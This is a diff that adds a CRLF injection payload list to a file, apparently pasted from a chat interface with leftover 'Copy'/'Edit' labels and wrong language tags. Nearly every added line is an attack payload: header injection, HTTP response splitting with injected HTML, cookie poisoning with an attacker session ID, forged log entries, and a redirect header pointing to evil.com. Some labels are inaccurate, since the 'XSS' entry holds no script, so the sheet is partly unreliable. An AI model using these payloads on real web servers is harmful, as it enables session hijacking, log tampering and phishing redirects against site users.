@@ -129,3 +129,52 @@ Copy
 Edit
 Search: hello
 Set-Cookie: admin=true
+
+
+
+
+
+✅ Basic Line Injection:
+perl
+Copy
+Edit
+%0D%0A
+\r\n
+✅ Header Injection (Add Custom Header):
+makefile
+Copy
+Edit
+%0D%0AX-Custom-Header: injected
+\r\nX-Custom-Header: injected
+✅ Response Splitting Example:
+mathematica
+Copy
+Edit
+%0D%0AHTTP/1.1 200 OK%0D%0AContent-Type: text/html%0D%0AContent-Length: 0%0D%0A%0D%0A<html>injected</html>
+✅ Cookie Poisoning:
+makefile
+Copy
+Edit
+%0D%0ASet-Cookie: sessionid=attacker
+✅ Log Injection (For Log Poisoning):
+pgsql
+Copy
+Edit
+%0A[CRITICAL] Unauthorized access by user: attacker
+✅ Fake Redirection via Headers:
+perl
+Copy
+Edit
+%0D%0ALocation: http://evil.com
+✅ JavaScript in Headers (XSS via Header Injection):
+pgsql
+Copy
+Edit
+%0D%0AX-XSS-Protection: 0
+%0D%0AContent-Security-Policy: default-src 'none'
+✅ Combination Payload for Detection:
+shell
+Copy
+Edit
+%0D%0AInjected-Header: test\r\nX-Test: crlf
+
